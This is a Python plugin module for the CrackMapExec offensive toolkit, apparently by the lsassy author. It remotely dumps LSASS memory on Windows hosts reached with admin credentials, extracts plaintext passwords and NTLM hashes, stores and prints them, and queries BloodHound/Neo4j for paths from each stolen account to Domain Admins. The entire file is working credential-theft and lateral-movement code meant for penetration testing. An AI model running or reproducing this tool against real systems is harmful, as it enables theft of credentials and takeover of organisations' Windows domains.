# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com [FR]
#  https://en.hackndo.com [EN]

import json
import sys

from lsassy import Lsassy, Logger, Dumper, Parser, Writer


class CMEModule:
    name = 'lsassy'
    description = "Dump lsass and parse the result remotely with lsassy"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
            METHOD              Method to use to dump lsass.exe with lsassy. See lsassy -h for more details
            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: Random)
            PROCDUMP_PATH       Path to procdump on attacker host (Required for method 2)
            DUMPERT_PATH        Path to procdump on attacker host (Required for method 5)
            BLOODHOUND          Enable Bloodhound integration (default: false)
            NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
            NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
            NEO4JUSER           Username for Neo4j database (default: 'neo4j')
            NEO4JPASS           Password for Neo4j database (default: 'neo4j')
            WITHOUT_EDGES       List of black listed edges (example: 'SQLAdmin,CanRDP', default: '')
        """

        self.method = False
        self.remote_lsass_dump = False
        self.procdump_path = False
        self.dumpert_path = False

        if 'METHOD' in module_options:
            self.method = module_options['METHOD']

        if 'REMOTE_LSASS_DUMP' in module_options:
            self.remote_lsass_dump = module_options['REMOTE_LSASS_DUMP']

        if 'PROCDUMP_PATH' in module_options:
            self.procdump_path = module_options['PROCDUMP_PATH']

        if 'DUMPERT_PATH' in module_options:
            self.dumpert_path = module_options['DUMPERT_PATH']

        self.bloodhound = False
        self.neo4j_URI = "127.0.0.1"
        self.neo4j_Port = "7687"
        self.neo4j_user = "neo4j"
        self.neo4j_pass = "neo4j"
        self.without_edges = ""

        if module_options and 'BLOODHOUND' in module_options:
            self.bloodhound = module_options['BLOODHOUND']
        if module_options and 'NEO4JURI' in module_options:
            self.neo4j_URI = module_options['NEO4JURI']
        if module_options and 'NEO4JPORT' in module_options:
            self.neo4j_Port = module_options['NEO4JPORT']
        if module_options and 'NEO4JUSER' in module_options:
            self.neo4j_user = module_options['NEO4JUSER']
        if module_options and 'NEO4JPASS' in module_options:
            self.neo4j_pass = module_options['NEO4JPASS']
        if module_options and 'WITHOUT_EDGES' in module_options:
            self.without_edges = module_options['WITHOUT_EDGES']

    def on_admin_login(self, context, connection):
        if self.bloodhound:
            self.set_as_owned(context, connection)

        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")
        kerberos = getattr(connection, "kerberos", "")

        password = "" if password is None else password
        lmhash = "" if lmhash is None else lmhash
        nthash = "" if nthash is None else nthash

        host = connection.host

        log_options = Logger.Options()
        dump_options = Dumper.Options()
        parse_options = Parser.Options()
        write_option = Writer.Options(format="json", quiet=True)

        if self.method:
            dump_options.method = int(self.method)

        if self.remote_lsass_dump:
            dump_options.dumpname = self.remote_lsass_dump

        if self.procdump_path:
            dump_options.procdump_path = self.procdump_path

        if self.dumpert_path:
            dump_options.dumpert_path = self.dumpert_path

        lsassy = Lsassy(
            kerberos=kerberos,
            hostname=host,
            username=username,
            domain=domain_name,
            password=password,
            lmhash=lmhash,
            nthash=nthash,
            log_options=log_options,
            dump_options=dump_options,
            parse_options=parse_options,
            write_options=write_option
        )
        credentials = lsassy.get_credentials()
        if not credentials['success']:
            context.log.error(credentials['error_msg'])
            if context.verbose and credentials['error_exception']:
                context.log.error(credentials['error_exception'])
        else:
            self.process_credentials(context, connection, credentials["credentials"])


    def process_credentials(self, context, connection, credentials):
        credentials = json.loads(credentials)
        if len(credentials) == 0:
            context.log.info("No credentials found")
        for domain, creds in credentials.items():
            for username, passwords in creds.items():
                for password in passwords:
                    plain = password["password"]
                    lmhash = password["lmhash"]
                    nthash = password["nthash"]
                    self.save_credentials(context, connection, domain, username, plain, lmhash, nthash)
                    self.print_credentials(context, connection, domain, username, plain, lmhash, nthash)



    @staticmethod
    def save_credentials(context, connection, domain, username, password, lmhash, nthash):
        host_id = context.db.get_computers(connection.host)[0][0]
        if password is not None:
            credential_type = 'plaintext'
        else:
            credential_type = 'hash'
            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
        context.db.add_credential(credential_type, domain, username, password, pillaged_from=host_id)

    def print_credentials(self, context, connection, domain, username, password, lmhash, nthash):
        if password is None:
            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
        output = "%s\\%s %s" % (domain, username, password)
        if self.bloodhound and self.bloodhound_analysis(context, connection, username):
            output += " [{}PATH TO DA{}]".format('\033[91m', '\033[93m') # Red and back to yellow
        context.log.highlight(output)

    def set_as_owned(self, context, connection):
        try:
            from neo4j.v1 import GraphDatabase
        except:
            from neo4j import GraphDatabase
        from neo4j.exceptions import AuthError, ServiceUnavailable
        host_fqdn = (connection.hostname + "." + connection.domain).upper()
        uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)

        try:
            driver = GraphDatabase.driver(uri, auth=(self.neo4j_user, self.neo4j_pass))
        except AuthError as e:
            context.log.error(
                "Provided credentials ({}:{}) are not valid. See --options".format(self.neo4j_user, self.neo4j_pass))
            sys.exit()
        except ServiceUnavailable as e:
            context.log.error("Neo4J does not seem to be available on {}. See --options".format(uri))
            sys.exit()
        except Exception as e:
            context.log.error("Unexpected error with Neo4J")
            context.log.debug("Error : ".format(str(e)))
            sys.exit()

        with driver.session() as session:
            with session.begin_transaction() as tx:
                result = tx.run(
                    "MATCH (c:Computer {{name:\"{}\"}}) SET c.owned=True RETURN c.name AS name".format(host_fqdn))
        if len(result.value()) > 0:
            context.log.success("Node {} successfully set as owned in BloodHound".format(host_fqdn))
        else:
            context.log.error(
                "Node {} does not appear to be in Neo4J database. Have you imported correct data ?".format(host_fqdn))
        driver.close()

    def bloodhound_analysis(self, context, connection, username):
        try:
            from neo4j.v1 import GraphDatabase
        except:
            from neo4j import GraphDatabase
        from neo4j.exceptions import AuthError, ServiceUnavailable
        username = (username + "@" + connection.domain).upper().replace("\\", "\\\\")
        uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)

        try:
            driver = GraphDatabase.driver(uri, auth=(self.neo4j_user, self.neo4j_pass))
        except AuthError as e:
            context.log.error(
                "Provided credentials ({}:{}) are not valid. See --options".format(self.neo4j_user, self.neo4j_pass))
            return False
        except ServiceUnavailable as e:
            context.log.error("Neo4J does not seem to be available on {}. See --options".format(uri))
            return False
        except Exception as e:
            context.log.error("Unexpected error with Neo4J")
            context.log.debug("Error : ".format(str(e)))
            return False

        edges = [
            "MemberOf",
            "HasSession",
            "AdminTo",
            "AllExtendedRights",
            "AddMember",
            "ForceChangePassword",
            "GenericAll",
            "GenericWrite",
            "Owns",
            "WriteDacl",
            "WriteOwner",
            "CanRDP",
            "ExecuteDCOM",
            "AllowedToDelegate",
            "ReadLAPSPassword",
            "Contains",
            "GpLink",
            "AddAllowedToAct",
            "AllowedToAct",
            "SQLAdmin"
        ]
        # Remove blacklisted edges
        without_edges = [e.lower() for e in self.without_edges.split(",")]
        effective_edges = [edge for edge in edges if edge.lower() not in without_edges]

        with driver.session() as session:
            with session.begin_transaction() as tx:
                query = """
                    MATCH (n:User {{name:\"{}\"}}),(m:Group),p=shortestPath((n)-[r:{}*1..]->(m))
                    WHERE m.objectsid ENDS WITH "-512" OR m.objectid ENDS WITH "-512"
                    RETURN COUNT(p) AS pathNb
                    """.format(username, '|'.join(effective_edges))

                context.log.debug("Query : {}".format(query))
                result = tx.run(query)
        driver.close()
        return result.value()[0] > 0
